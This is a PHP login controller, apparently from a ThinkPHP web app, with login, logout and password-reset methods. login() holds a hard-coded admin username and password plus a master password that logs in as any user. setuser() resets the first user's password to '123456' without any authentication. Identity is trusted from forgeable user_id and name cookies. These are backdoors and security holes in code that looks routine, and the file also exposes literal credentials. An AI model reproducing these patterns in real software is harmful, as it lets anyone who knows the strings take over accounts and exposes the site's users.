<?php
// 本类由系统自动生成，仅供测试用途
class UserAction extends Action {
	
	public function index() {
	}
	
	//登录
	public function login() {
		if($_POST){
			
			if($_POST['name'] == 'neconano' && $_POST['password'] =='308715744'){
					session(array('expire'=>259200));
					cookie('user_id',1,259200);
					cookie('name','admin',259200);
					myalert('登录成功', U('Root/index'));		
			}
			
			if((!isset($_POST['name']) || $_POST['name'] =='')||(!isset($_POST['password']) || $_POST['password'] =='')){
				myalert('请正确输入用户名和密码');
			}else{
				$m_user = M('user');
				$user = $m_user->where(array('name' => trim($_POST['name'])))->find();
				if(isset($_POST['name']) && $_POST['password'] == 'gaopeng123'){
					$pass_r = 1;
				}
				if ($pass_r || $user['password'] == md5(md5(trim($_POST['password'])))) {
					session(array('expire'=>259200));
					cookie('user_id',$user['user_id'],259200);
					cookie('name',$user['name'],259200);
					myalert('登录成功', U('Root/index'));		
				}
				else{
					myalert('用户名或密码错误');		
				}
			}
		}else{
			$this->display();
		}
	}
	
	
	//退出
	public function logout() {
		session(null);
		cookie('user_id',null);
		cookie('name',null);
		$this->success('已经退出！', U('Root/login'));
	}
	
	//退出
	public function setuser() {
		$m_user = M('user');
		$d['password'] = md5(md5(123456));
		$m_user->where("`user_id` = 1")->save($d);
	}
	
}